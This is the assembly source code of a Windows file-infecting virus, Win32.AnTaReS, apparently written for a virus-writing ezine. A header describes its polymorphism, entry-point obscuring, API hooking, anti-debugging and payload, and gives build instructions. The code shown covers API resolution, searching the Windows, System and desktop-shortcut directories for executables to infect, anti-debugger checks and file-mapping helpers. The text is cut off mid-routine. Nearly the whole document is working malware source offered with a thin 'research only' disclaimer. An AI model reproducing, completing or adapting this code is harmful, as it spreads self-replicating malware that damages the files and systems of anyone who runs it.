;####################################[Win32.AnTaReS by PiKaS]#####
;#
;# Author: PiKaS         @0@0@ @   @ @0@0@ @0@0@ @0@0@ @0@0@ @0@0@
;#                       0   0 0@  0   0   0   0 0   0 0     0
;# lordjoker@hotmail.com @0@0@ @ 0 @   @   @0@0@ @0@0@ @0@0@ @0@0@
;#                       0   0 0  @0   0   0   0 0  @  0         0
;# Name: Win32.AnTaReS   @   @ @   @   @   @   @ @   @ @0@0@ @0@0@
;#
;#################################################################

;#################################################################
;# AnTaReS / Alpha Sco                      #
;#  Distance: 604.01 ly                    ###+++++++++++++++
;#  Abs. Mag: -5.28                       #####
;#  Luminosity: 11,100xSun               #######+++++++++++++++++
;#  Class: M1 l-b                         #####
;#  Radius: 449.59xSun                     ###+++++++++++++++
;#  Surface temp: 3,720K                    #
;#################################################################

;#################################################################
;#
;# Characteristics:
;# ----------------
;# - Target: Portable Exe (PE), SCR, CPL
;# - Get Apis using CRC32 with SEH protection
;# - EPO (Patch Masm/Tasm calls randomly)
;# - PolyMorphic Virus (using [ETMS] by b0z0/iKX)
;# - Find Targets through Link Files (Current dir and Desktop dir)
;# - Resident Per-Process (Hooks APIs like CreateFileA, etc...
;#    and extract a new path for infections)
;# - Direct Action Virus (Windows, System and Actual Directories)
;# - Anti-Debugging (Jump if a Debug program is detected...SoftIce)
;# - CRC32 CheckSum File (Rebuild CRC32 of Infected Files)
;# - Detect SFC protected files and Installation Kits
;# - Use Size Padding to avoid reinfections
;#    (also used with failed infections to scan faster)
;#
;# Payload:
;# --------
;# - Graphic payload -> If 31th a BioHazard symbol appear on window
;#
;# Size: ---> 14156 Bytes (10.2Kb Min. Size - 13.8Kb Max. Size) <---
;# -----
;#          [EPO]-->[DECRIPTOR][VIRUS_BODY/VIRUS_DATA]
;#
;# To Build this:
;# --------------
;# - tasm32 -m7 -ml -q -zn AnTaReS.asm
;# - tlink32 -Tpe -c -aa -v AnTaReS ,,, import32
;# - pewrsec AnTaReS.exe
;#
;# Author Notes:
;# ------------- 
;# - This Virus is dedicated to all VXers and friends
;# - Thanks to Dream Theater and Bind Guardian Music
;# - To Asimov Books (about the Universe, etc...) ;)
;# - Sorry for my poor English :P
;#
;# Disclaimer:
;# -----------
;# - This software is for research purposes only
;# - The author is not responsible for any problems
;#    caused due to improper or illegal usage of it
;#      
;#################################################################

;#################################################################
;#
;# Notes:
;# ------
;# - Win32.AnTaReS was written to be published in 29A-ezine(9)...
;#    The ezine was never released and 29A has recently gone
;#    retired. VirusBuster, GriYo, Wintermute... I will miss you
;#    Thanks for your work, you are my personal heroes
;#
;#################################################################

.586p
.model flat,stdcall

;#################################################################
;# Apis for Host code
;#################################################################
extrn   ExitProcess:proc
extrn   MessageBoxA:proc

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# General Definitions 
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Definitions (Main)
;#################################################################
@VirusSize      equ     offset @VirusEnd - offset @VirusBegin
@VirusBodySize  equ     offset @VirusEnd - offset @VirusBodyBegin
@DeltaCritical  equ     offset @Critical - offset @VirusBodyBegin

;#################################################################
;# Definitions (File Handle)
;#################################################################
OPEN_EXISTING           equ     3       ; Some useful definitions
GENERIC_READ            equ     80000000h
GENERIC_WRITE           equ     40000000h
PAGE_READWRITE          equ     00000004h
FILE_MAP_ALL_ACCESS     equ     000F001Fh

;#################################################################
;# Definitions (Find Files)
;#################################################################
MAX_PATH        equ     260             ; The Max Long of Path

FILETIME struc                          ; File Time Struct
 FT_dwLowDateTime       dd      ?
 FT_dwHighDateTime      dd      ?
FILETIME ends

WIN32_FIND_DATA struc                   ; Find File Struct
 WFD_dwFileAttributes           dd              ?
 WFD_ftCreationTime             FILETIME        ?
 WFD_ftLastAccessTime           FILETIME        ?
 WFD_ftLastWriteTime            FILETIME        ?
 WFD_nFileSizeHigh              dd              ?
 WFD_nFileSizeLow               dd              ?
 WFD_dwReserved0                dd              ?
 WFD_dwReserved1                dd              ?
 WFD_szFileName                 db      MAX_PATH DUP (?)
 WFD_szAlternateFileName        db      13 DUP (?)
                                db      3 DUP (?)
WIN32_FIND_DATA ends

;#################################################################
;# Definitions (Find Link Files)
;#################################################################
HKEY_CURRENT_USER       equ     080000001h
KEY_READ                equ     000000019h

;#################################################################
;# Definitions (Payload)
;#################################################################
SM_CXSCREEN     equ     00000000h       ; To get the resolution of screen
SM_CYSCREEN     equ     00000001h
IDI_WARNING     equ     00007F03h       ; A warning Icon
MB_ICONHAND     equ     00000010h       ; A warning Sound

SYSTEMTIME struct                       ; Struct to check the actual date
 wYear          dw      ?
 wMonth         dw      ?
 wDayOfWeek     dw      ?
 wDay           dw      ?
 wHour          dw      ?
 wMinute        dw      ?
 wSecond        dw      ?
 wMilliseconds  dw      ?
SYSTEMTIME ends

;#################################################################
;# Definitions (Virus Core)
;#################################################################
FILE_ATTRIBUTE_NORMAL   equ     00000080h
GPTR                    equ     00000040h

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Host Data and Code Sections 
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
.data
Antares db      'PiKaS LaBs 05',0       ; A Message Box text
Text    db      'PiKaS LaBs / Win32.AnTaReS',0

.code
HostStart:
    xor     eax,eax                 ; The Host code
    push    eax
    push    offset Antares
    push    offset Text             ; A simple Message Box
    push    eax
    call    @VirusBegin             ; Call to MessageBoxA has been patched ;)
    xor     eax,eax                 ; And finish!
    push    eax
    call    ExitProcess

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Virus Code (win32.AnTaReS)
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Virus Main Body
;#  In: No Input
;#  Out: No Output
;#################################################################
@VirusBegin:
    pushad                          ; Save the Host registes
    pushfd
@Decryptor:     db      1000h dup (90h) ; Decryptor of virus body
@VirusBodyBegin:
    call    GetDelta                ; Just take the delta offset
;#################################################################
;# Set SEH (Exception Handling)
;#################################################################
SetSeh:
    push    ebp
    call    Set@1                   ; Push in Stack the New Excp Handler
    mov     esp,[esp+08h]           ; If Excp -> Set Stack and go out
    jmp     ResetSeh
Set@1:
    xor     ebx,ebx
    push    dword ptr fs:[ebx]      ; Push in Stack old Excp Handler (Chain)
    mov     fs:[ebx],esp            ; Set new Excp Handler
    call    GetApiAddress           ; Get all apis address from Kernel
    or      eax,eax  
    jz      ResetSeh
    call    GetSeed                 ; Init the random number generator
    call    AntiDebug               ; Check if a debugger is present
    or      eax,eax                 ; Ups! skip and go out
    jz      ResetSeh
    call    FindBody                ; Main search virus body
    call    Payload                 ; Whahaha... a graphic payload
;#################################################################
;# Reset SEH (Exception Handling)
;#################################################################
ResetSeh:
    xor     ebx,ebx
    pop     dword ptr fs:[ebx]      ; Recover old Excp Handler
    pop     ebx
    pop     ebp
    call    PatchVirusEntryPoint    ; Go to Host taking care of relocations
    popfd                           ; Pop host registers
    popad
    push    20202020h               ; And finish! :)
@ReturnHost     equ     $-4
    ret

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Get Kernel Apis
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Get Kernel Address
;#  In: eax=AddrCreateProcess
;#  Out: eax=AddrBaseKernel Error: eax=00h
;#################################################################
GetKernelAddress proc
    push    ebx ecx edx             ; Save registers
    mov     ecx,05h                 ; Only 5 times
    shr     eax,10h                 ; Sth like AND EAX,0FFFF0000h
GetKernel@1:
    shl     eax,10h
    mov     bx,[eax]                ; Is the Kernel Base Image?
    cmp     bx,'ZM'
    jnz     GetKernel@2
    mov     edx,eax
    add     edx,[eax+3Ch]
    mov     bx,[edx]                ; Is a Portable Exe?
    cmp     bx,'EP'
    jz      GetKernel@3             ; Great!
GetKernel@2:
    shr     eax,10h                 ; Ups! One more time
    dec     eax
    loop    GetKernel@1
    xor     eax,eax                 ; Ups! bad news.. :(
GetKernel@3:
    pop     edx ecx ebx             ; Pop registers
    ret
GetKernelAddress endp

;#################################################################
;# Get All Api Address
;#  In: eax=AddrBaseKernel esi->ApisCrc32Struct
;#  Out: (ApisAddrFull) Error: eax=00h
;#################################################################
GetAllApiAddress proc
    push    ebx ecx eax             ; Save registers
    mov     ebx,[eax+3Ch]           ; Move to the Kernel Base
    add     eax,ebx
    mov     ebx,[eax+78h]           ; And now the Export Section
    pop     eax
    mov     ecx,eax
    add     eax,ebx
    mov     ebx,[eax+18h]           ; Get the total number of apis
    or      ebx,ebx                 ;  imported by name
    jz      GetAll@6
    mov     [@NumberNames+ebp],ebx
    mov     ebx,[eax+1Ch]
    add     ebx,ecx
    mov     [@AddressTable+ebp],ebx ; Get the Addr of Address Table
    mov     ebx,[eax+24h]
    add     ebx,ecx
    mov     [@OrdinalTable+ebp],ebx ; Get the Addr of Ordinal Table
    mov     ebx,[eax+20h]
    add     ebx,ecx
    mov     [@NameTable+ebp],ebx    ; And get the Addr of Name Table
    push    edx edi esi             ; Save registers
    xor     eax,eax
    mov     edi,esi
SetZero@1:
    cmp     byte ptr[edi],0EEh      ; Is the last in the table?
    jz      SetZero@2
    add     edi,04h
    stosd                           ; Set zero all the Api Struct
    jmp     SetZero@1
SetZero@2:
    xor     edx,edx                 ; Set zero the counter
    mov     esi,ebx                 ; Set esi -> Name Table
GetAll@1:
    lodsd
    add     eax,ecx
    mov     edi,eax                 ; Now edi -> Api Name (in Name Table)
    call    GetStringLong           ; Get the String Long
    mov     esi,edi                 ; Set esi -> Api Name String
    mov     edi,eax                 ; Set edi = Api Name Long
    call    GetStringCrc32          ; And the new Crc32 of the String
    pop     esi
    push    esi                     ; esi -> ApisCrc32Struc
    mov     ebx,eax                 ; Save the Crc32 in ebx
    xor     edi,edi                 ; Counter of Apis left
GetAll@2:
    cmp     byte ptr[esi],0EEh      ; If we finish the ApisCrc32Struc 
    jz      GetAll@3                ;  then go out the loop
    lodsd
    sub     eax,ebx                 ; Check if we need the Api
    jz      GetAll@4
    lodsd                           ; If not go on (and Inc the Counter
    or      eax,eax                 ;  of Apis Letft)
    jnz     GetAll@2
    inc     edi
    jmp     GetAll@2
GetAll@4:                               ; Then get the Api Address
    push    ebx                     ; Save registers
    mov     eax,edx
    shl     eax,01h
    add     eax,[@OrdinalTable+ebp] ; Get the Ordinal of Api 
    movzx   ebx,word ptr[eax]
    shl     ebx,02h
    add     ebx,[@AddressTable+ebp] ; Get the RVA of Api
    mov     eax,[ebx]
    add     eax,ecx                 ; Add the Kernel Base
    push    edi
    mov     edi,esi
    stosd                           ; Storage the Address in the Struct
    pop     edi ebx                 ; Pop registers
    lodsd
    jmp     GetAll@2
GetAll@3:
    or      edi,edi                 ; Check the Counter of Apis left
    jz      GetAll@5                ; We need no more Apis... finish
    inc     edx                     ; Inc the Name number
    mov     esi,edx
    shl     esi,02h
    add     esi,[@NameTable+ebp]    ; Set again esi and go back
    dec     [@NumberNames+ebp]
    jnz     GetAll@1                ; No more names? ups...
    pop     esi edi edx
GetAll@6:
    xor     eax,eax
    pop     ecx ebx
    ret
GetAll@5:
    xor     eax,eax                 ; No error... all under control
    inc     eax
    pop     esi edi edx ecx ebx     ; Pop registers
    ret
GetAllApiAddress endp

;#################################################################
;# Get Api Address
;#  In: @ImageBase
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
GetApiAddress proc
    mov     ebx,[@ImageBase+ebp]
    mov     esi,ebx
    add     esi,[ebx+3Ch]           ; Get the Portable Exe header
    add     esi,80h
    lodsd
    or      eax,eax                 ; Test if we have import header
    jz      GetImport@1
    add     eax,ebx
    mov     ecx,eax                 ; Well, take a look at the import module
GetImport@2:
    mov     esi,[ecx+0Ch]
    or      esi,esi                 ; If the last go out
    jz      GetImport@1
    add     esi,ebx
    lodsd
    or      eax,20202020h           ; Make the string low case
    cmp     eax,'nrek'
    jnz     GetImport@3
    lodsd
    or      eax,20202020h
    cmp     eax,'23le'              ; It's the kernel import module?
    jz      GetImport@4
GetImport@3:
    add     ecx,14h                 ; Nop, try another one
    jmp     GetImport@2
GetImport@4:
    mov     esi,[ecx+10h]           ; Fine! get some apis address
    or      esi,esi
    jz      GetImport@1
    add     esi,ebx
    lea     edi,[@ApisCrc32+ebp]
GetImport@5:
    lodsd                           ; Load the first one
    or      eax,eax
    jz      GetImport@1             ; Is it the last? well...
    call    GetKernelAddress        ; Get the library base of imported api
    or      eax,eax
    jz      GetImport@5             ; Error?... try with other one
    mov     [@KernelBase+ebp],eax
    xchg    esi,edi
    call    GetAllApiAddress        ; Save the base and try to get all the apis
    or      eax,eax                 ; Error?... try with other one
    jnz     GetImport@6             ; Great! we got them... go out :D
    xchg    esi,edi
    jmp     GetImport@5
GetImport@1:
    xor     eax,eax                 ; Ups, this is critical... bad luck
    ret
GetImport@6:
    xor     eax,eax
    inc     eax                     ; well done... we have the correct address
    ret
GetApiAddress endp

;#################################################################
;# Get String Long
;#  In: edi->String
;#  Out: eax=StringLong
;#################################################################
GetStringLong proc
    push    edi                     ; Save edi
    xor     al,al
    scasb                           ; Scan String till null char
    jnz     $-1
    mov     eax,edi
    pop     edi
    sub     eax,edi                 ; Get the String Long
    ret
GetStringLong endp

;#################################################################
;# Get String Crc32
;#  In: esi->String edi=StringLong
;#  Out: eax=Crc32String
;#################################################################
GetStringCrc32 proc
    push    ebx ecx edx             ; Save registers
    cld
    xor     ecx,ecx                 ; Set ecx=0FFFFFFFFh
    dec     ecx
    mov     edx,ecx
GetCrc@1:                               ; Now the next Byte Crc32
    xor     eax,eax                 ; Set eax and ebx zero
    xor     ebx,ebx
    lodsb                           ; Get one byte of String
    xor     al,cl
    mov     cl,ch
    mov     ch,dl
    mov     dl,dh
    mov     dh,08h
GetCrc@2:                               ; Next Bit Crc32
    shr     bx,01h
    rcr     ax,01h
    jnc     GetCrc@3
    xor     ax,08320h
    xor     bx,0EDB8h
GetCrc@3:                               ; Finish... no Crc32
    dec     dh
    jnz     GetCrc@2
    xor     ecx,eax
    xor     edx,ebx
    dec     edi                     ; One byte less
    jnz     GetCrc@1
    not     edx
    not     ecx
    mov     eax,edx
    rol     eax,10h                 ; We got in eax the Crc32 of Api Name
    mov     ax,cx
    pop     edx ecx ebx             ; Pop registers
    ret
GetStringCrc32 endp

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Find New Files
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Find Body
;#  In: No Input
;#  Out: No Output
;#################################################################
FindBody proc
    call    LoadSfcLibrary          ; Check if Sfc is present and load it
    mov     edi,05h                 ; Number of Infections
    call    FindDirectAction        ; Call to Direct Action part
    lea     edi,[@Advapi32N+ebp]
    lea     esi,[@Advapi32+ebp]
    call    LoadNewLibrary          ; Load a Library we need
    or      eax,eax
    jz      FindBody@1              ; If not posible... go out
    mov     edi,05h                 ; Number of Infections
    call    FindLinkFiles           ; Call to Linked Files part
    lea     edi,[@Advapi32N+ebp]
    call    FreeNewLibrary          ; Free Library after use
FindBody@1:
    lea     esi,[@ApisCrc32Hooks+ebp]
    lea     edi,[@OffsetsHookStruct+ebp]
    call    SetAllHooks             ; Set the PerProcess part
    mov     eax,[@SfcIsFileProtected+ebp]
    or      eax,eax
    jz      FindBody@2
    lea     edi,[@SfcN+ebp]         ; Free the Sfc library
    call    FreeNewLibrary
FindBody@2:
    ret
FindBody endp

;#################################################################
;# Find Direct Action
;#  In: edi=Number of Files per Directory
;#  Out: No output
;#################################################################
FindDirectAction proc
    pushad                          ; Save all registers
    call    FindDirectory           ; Find and Infect files in actual dir
    lea     esi,[@PathOne+ebp]
    push    esi
    push    MAX_PATH                ; Get the current directory
    call    [@GetCurrentDirectoryA+ebp]
    or      eax,eax
    jz      FindAction@1
    push    MAX_PATH
    lea     esi,[@PathTwo+ebp]
    push    esi                     ; Get the Windows directory
    call    [@GetWindowsDirectoryA+ebp]
    or      eax,eax
    jz      FindAction@2
    lea     esi,[@PathTwo+ebp]
    push    esi                     ; Jump to Windows directory
    call    [@SetCurrentDirectoryA+ebp]
    or      eax,eax
    jz      FindAction@2
    call    FindDirectory           ; Find and Infect files in Windows dir
FindAction@2:
    push    MAX_PATH
    lea     esi,[@PathTwo+ebp]
    push    esi                     ; Get the System directory
    call    [@GetSystemDirectoryA+ebp]
    or      eax,eax
    jz      FindAction@3
    lea     esi,[@PathTwo+ebp]
    push    esi                     ; Jump to System directory
    call    [@SetCurrentDirectoryA+ebp]
    or      eax,eax
    jz      FindAction@3
    call    FindDirectory           ; Find and Infect files in System dir
FindAction@3:
    lea     esi,[@PathOne+ebp]
    push    esi                     ; Jump to the initial directory
    call    [@SetCurrentDirectoryA+ebp]
FindAction@1:
    popad                           ; Pop all registers
    ret
FindDirectAction endp

;#################################################################
;# Find Directory
;#  In: edi=Number of Files per Directory
;#  Out: No output
;#################################################################
FindDirectory proc
    push    edi                     ; Save edi register
    lea     esi,[@FindData+ebp]     ; Load Find Data Struct
    push    esi
    lea     esi,[@FindMask+ebp]     ; Looking for all type files (*.*)
    push    esi
    call    [@FindFirstFileA+ebp]   ; Call to FindFirstFileA Api
    inc     eax
    jz      FindDir@1               ; If no files go out... :(
    dec     eax
    mov     [@FindHandle+ebp],eax   ; Save the Find Handle
FindDir@4:
    call    CheckExtension          ; Check if file is EXE DLL SCR or CPL
    or      eax,eax
    jz      FindDir@2
    call    IsFileOk                ; Check if the file is infected etc...
    or      eax,eax
    jz      FindDir@2
    call    InfectFile              ; Infect the file
    or      eax,eax
    jz      FindDir@2
    dec     edi                     ; One file less
    jz      FindDir@3
FindDir@2:
    lea     esi,[@FindData+ebp]     ; Reload the Find Data Struct
    push    esi
    mov     eax,[@FindHandle+ebp]   ; The Find Handle
    push    eax
    call    [@FindNextFileA+ebp]    ; Find more files in directory
    or      eax,eax
    jnz     FindDir@4
FindDir@3:
    mov     eax,[@FindHandle+ebp]   ; No more files, close the Find Handle
    push    eax
    call    [@FindClose+ebp]
FindDir@1:
    pop     edi                     ; Pop edi again (is a counter)
    ret
FindDirectory endp

;#################################################################
;# Check Extension
;#  In: @FindData
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
CheckExtension proc
    push    edi                     ; Save edi register
    lea     edi,[@FindData.WFD_szFileName+ebp]
    call    GetStringLong           ; Get the String Long
    cmp     eax,05h                 ; If String too short skip and go
    jna     CheckExt@1
    mov     esi,edi
    add     esi,eax
    sub     esi,05h                 ; Get the last 4 bytes of string
    lodsd
    mov     ecx,04h
CheckExt@3:                             ; Make it Upper Case
    cmp     al,'a'
    jb      CheckExt@2
    cmp     al,'z'
    ja      CheckExt@2
    add     al,'A'-'a'
CheckExt@2:
    ror     eax,08h                 ; Next byte
    loop    CheckExt@3
    cmp     eax,'EXE.'              ; Is an EXE file?
    jz      CheckExt@4
    cmp     eax,'LPC.'              ; Is a CPL file?
    jz      CheckExt@4
    cmp     eax,'RCS.'              ; Is a SCR file?
    jz      CheckExt@4
CheckExt@1:                             ; If not... just make eax zero
    xor     eax,eax
CheckExt@4:
    pop     edi                     ; Fine! go back
    ret
CheckExtension endp

;#################################################################
;# Find Link Files
;#  In: edi=Number of Files per Directory
;#  Out: No output
;#################################################################
FindLinkFiles proc
    pushad
    call    FindLink                ; Find Link files in current dir
    lea     esi,[@PathOne+ebp]
    push    esi
    push    MAX_PATH                ; Get Current directory
    call    [@GetCurrentDirectoryA+ebp]
    or      eax,eax
    jz      FindLink@1
    lea     esi,[@PathTwo+ebp]
    call    GetDesktopDirectory     ; Get Desktop directory
    or      eax,eax                 ; Error... skip action
    jz      FindLink@1
    lea     esi,[@PathTwo+ebp]
    push    esi
    call    [@SetCurrentDirectoryA+ebp]
    or      eax,eax                 ; Jump to the Desktop dir
    jz      FindLink@1
    call    FindLink                ; Find Link files in Desktop dir
    lea     esi,[@PathOne+ebp]
    push    esi                     ; Go back to current dir
    call    [@SetCurrentDirectoryA+ebp]
FindLink@1:
    popad
    ret
FindLinkFiles endp

;#################################################################
;# Get Desktop Directory
;#  In: esi->Buffer for Desktop Directory
;#  Out: Get the Desktop in Buffer Error: eax=00h
;#################################################################
GetDesktopDirectory proc
    push    edi
    xor     eax,eax
    lea     edi,[@RegHandle+ebp]    ; Handle of Register we want check
    push    edi
    push    KEY_READ                ; Only read a value
    push    eax
    lea     edi,[@SubKey+ebp]       ; The Subkey we're looking for
    push    edi
    push    HKEY_CURRENT_USER       ; Yes... in this register place
    call    [@RegOpenKeyExA+ebp]    ; Open the key
    or      eax,eax
    jnz     GetDesktop@1
    lea     edi,[@RegSize+ebp]      ; Push the buffer size
    push    edi
    push    esi
    lea     edi,[@RegType+ebp]      ; The text is REG_SZ
    push    edi
    push    eax
    lea     edi,[@RegName+ebp]      ; We want the Desktop value
    push    edi
    mov     eax,[@RegHandle+ebp]    ; This is the Handle before
    push    eax
    call    [@RegQueryValueExA+ebp] ; Query the register value
    or      eax,eax
    jnz     GetDesktop@2
    mov     edi,esi
    call    GetStringLong           ; Check if the path is valid
    dec     eax
    jz      GetDesktop@2
    inc     eax
    add     esi,eax
    sub     esi,02h
    lodsb
    cmp     al,'\'                  ; If not valid put \ after asciiz
    jz      GetDesktop@3
    mov     edi,esi
    mov     ax,'\'
    stosd
GetDesktop@3:
    mov     eax,[@RegHandle+ebp]    ; Close the opened register
    push    eax
    call    [@RegCloseKey+ebp]
    or      eax,eax
    jnz     GetDesktop@1
    inc     eax
    pop     edi                     ; Output: eax not zero
    ret
GetDesktop@2:
    mov     eax,[@RegHandle+ebp]
    push    eax
    call    [@RegCloseKey+ebp]
GetDesktop@1:
    xor     eax,eax                 ; Output: eax zero (error)
    pop     edi
    ret
GetDesktopDirectory endp

;#################################################################
;# Find Link
;#  In: edi=Number of Files per Directory
;#  Out: No output
;#################################################################
FindLink proc
    push    edi                     ; Save edi register
    lea     esi,[@FindData+ebp]     ; Load Find Data Struct
    push    esi
    lea     esi,[@FindLink+ebp]     ; Looking for link files (*.LNK)
    push    esi
    call    [@FindFirstFileA+ebp]   ; Call to FindFirstFileA Api
    inc     eax
    jz      FindLinkFile@1          ; If no files go out... :(
    dec     eax
    mov     [@FindHandle+ebp],eax   ; Save the Find Handle
FindLinkFile@4:
    call    ExtractLink             ; Extract the Linked file target
    call    CheckExtension          ; Check if file is EXE DLL SCR or CPL
    or      eax,eax                 ; If not go on with other files
    jz      FindLinkFile@2
    call    IsFileOk                ; Check if the file is infected etc...
    or      eax,eax
    jz      FindLinkFile@2
    call    InfectFile              ; Infect the file
    or      eax,eax
    jz      FindLinkFile@2
    dec     edi                     ; One file less
    jz      FindLinkFile@3
FindLinkFile@2:
    lea     esi,[@FindData+ebp]     ; Reload the Find Data Struct
    push    esi
    mov     eax,[@FindHandle+ebp]   ; The Find Handle
    push    eax
    call    [@FindNextFileA+ebp]    ; Find more files in directory
    or      eax,eax
    jnz     FindLinkFile@4
FindLinkFile@3:
    mov     eax,[@FindHandle+ebp]   ; No more files, close the Find Handle
    push    eax
    call    [@FindClose+ebp]
FindLinkFile@1:
    pop     edi                     ; Pop edi again (is a counter)
    ret
FindLink endp

;#################################################################
;# Extract Link
;#  In: edi=Number of Files per Directory
;#  Out: No output
;#################################################################
ExtractLink proc
    push    edi ecx
    lea     esi,[@FindData.WFD_szFileName+ebp]
    call    CreateFile              ; Open the Link file
    inc     eax
    jz      Extract@1               ; If error go out
    dec     eax
    mov     [@OpenHandle+ebp],eax   ; Push some values and create a map
    mov     edi,[@FindData.WFD_nFileSizeLow+ebp]
    mov     esi,[@FindData.WFD_nFileSizeHigh+ebp]
    call    FileMapping
    or      eax,eax
    jz      Extract@2               ; If error close file
    mov     [@MapHandle+ebp],eax
    call    MapViewOfFile           ; Map it now!
    or      eax,eax
    jz      Extract@3
    mov     [@FileAddr+ebp],eax     ; Save the file Addr
    mov     ecx,[eax]
    cmp     ecx,'L'                 ; Check for Link valid file
    jnz     Extract@4
    mov     ecx,[eax+14h]           ; Look if file has item ID list
    and     ecx,03h                 ;  and points to a file or dir
    cmp     ecx,03h
    jnz     Extract@4               ; If not skip and go out
    mov     esi,eax
    xor     eax,eax
    add     esi,4Ch
    lodsw
    add     esi,eax                 ; Jump over item ID list
    mov     ecx,[esi+08h]
    and     ecx,01h                 ; Check we have local volume
    jz      Extract@4
    mov     eax,[esi+10h]           ; Go to the local volume
    add     esi,eax
    mov     edi,esi
    call    GetStringLong
    mov     ecx,eax                 ; Set some registers and copy it
    lea     edi,[@FindData.WFD_szFileName+ebp]
    cld
    rep     movsb
Extract@4:
    mov     eax,[@FileAddr+ebp]     ; Unmap the Link file
    call    UnmapViewOfFile
Extract@3:
    mov     eax,[@MapHandle+ebp]
    call    CloseHandle             ; Close the mapped file
Extract@2:
    mov     eax,[@OpenHandle+ebp]
    call    CloseHandle             ; And close the open file
Extract@1:
    pop     ecx edi
    ret
ExtractLink endp

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;#################################################################
;# Useful Functions
;#################################################################
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

;#################################################################
;# Get Seed
;#  In: No Input
;#  Out: No Output
;#################################################################
GetSeed proc
    call    [@GetTickCount+ebp]
    mov     [@Random+ebp],eax
    ret
GetSeed endp

;#################################################################
;# Get Random
;#  In: No Input
;#  Out: eax=RandomValue
;#################################################################
GetRandom proc
    mov     eax,[@Random+ebp]
    imul    eax,eax,65h
    add     eax,0167h
    mov     [@Random+ebp],eax
    ret
GetRandom endp

;#################################################################
;# Align
;#  In: eax=ValueToAlign ecx=AlignFactor
;#  Out: eax=AlignedValue
;#################################################################
Align proc
    push    edx
    xor     edx,edx                 ; Make edx zero
    push    eax
    div     ecx                     ; Div eax with ecx align factor
    pop     eax
    sub     ecx,edx                 ; Add to eax the rest to have
    add     eax,ecx                 ;  an aligned value
    pop     edx
    ret
Align endp

;#################################################################
;# Trunc File
;#  In: ebx=Size to Move
;#  Out: (eax not zero) Error: eax=00h
;#################################################################
TruncFile proc
    xor     eax,eax
    push    eax                     ; Pointer from start of file
    push    eax
    push    ebx                     ; Move this size
    push    [@OpenHandle+ebp]       ; File handle
    call    [@SetFilePointer+ebp]   ; Move the file pointer
    push    [@OpenHandle+ebp]
    call    [@SetEndOfFile+ebp]     ; And make this point the EOF
    ret
TruncFile endp

;#################################################################
;# Anti Debug
;#  In: No Input
;#  Out: eax=01h (no debug) eax=00h (debug)
;#################################################################
AntiDebug proc
    push    ebp
AntiEmul@1:
    call    AntiEmul@2              ; Push in Stack the New Excp Handler
    mov     esp,[esp+08h]           ; If Excp -> Set Stack and go out
    jmp     AntiEmul@3
AntiEmul@2:
    xor     eax,eax
    push    dword ptr fs:[eax]      ; Push in Stack old Excp Handler (Chain)
    mov     fs:[eax],esp            ; Set new Excp Handler
    div     eax                     ; Cause an Exception to fuck some emul/debug
    jmp     AntiEmul@1
AntiEmul@3:
    xor     eax,eax
    pop     dword ptr fs:[eax]      ; Recover old Excp Handler
    pop     eax
    pop     ebp
    lea     esi,[@SoftIceA+ebp]
    call    CreateFile              ; Try to check SoftIce debugger in win9X
    inc     eax
    jz      AntiDebug@2
    dec     eax
    call    CloseHandle
    jmp     AntiDebug@1
AntiDebug@2:
    lea     esi,[@SoftIceB+ebp]
    call    CreateFile              ; Try to check SoftIce debugger in winNT
    inc     eax
    jz      AntiDebug@3
    dec     eax
    call    CloseHandle
AntiDebug@1:
    xor     eax,eax                 ; Hummm... skip and go out
    ret
AntiDebug@3:
    inc     eax                     ; Fine... no debugger present, go on!
    ret
AntiDebug endp

;#################################################################
;# Create File
;#  In: esi->File Name
;#  Out: eax=OpenHandle Error: eax=-1
;#################################################################
CreateFile proc
    xor     eax,eax
    push    eax                     ; Push normal values
    push    eax
    push    OPEN_EXISTING           ; Open a file if existing
    push    eax
    inc     eax
    push    eax
    push    GENERIC_READ or GENERIC_WRITE
    push    esi                     ; With permision for read / write
    call    [@CreateFileA+ebp]
    ret
CreateFile endp

;#################################################################
;# File Mapping
;#  In: esi=FileSizeHigh edi=FileSizeLow eax=OpenHandle
;#  Out: eax=MapHandle Error: eax=00h
;#################################################################
FileMapping proc
    push    ebx
    xor     ebx,ebx
    push    ebx
    push    edi                     ; File Size Low
    push    esi                     ; File Size High
    push    PAGE_READWRITE          ; Read / write permision in page
    push    ebx
    push    eax                     ; Open Handle
    call    [@CreateFileMappingA+ebp]
    pop     ebx
    ret
FileMapping endp

;#################################################################
;# Map View Of File
;#  In: esi=FileSizeHigh edi=FileSizeLow eax=MapHandle
;#  Out: eax=FileAddr Error: eax=00h
;#################################################################
MapViewOfFile proc
    push    ebx
    xor     ebx,ebx
    push    edi                     ; File Size Low
    push    ebx
    push    ebx
    push    FILE_MAP_ALL_ACCESS     ; All type of access in map
    push    eax                     ; Map Handle
    call    [@MapViewOfFile+ebp]
    pop     ebx
    ret
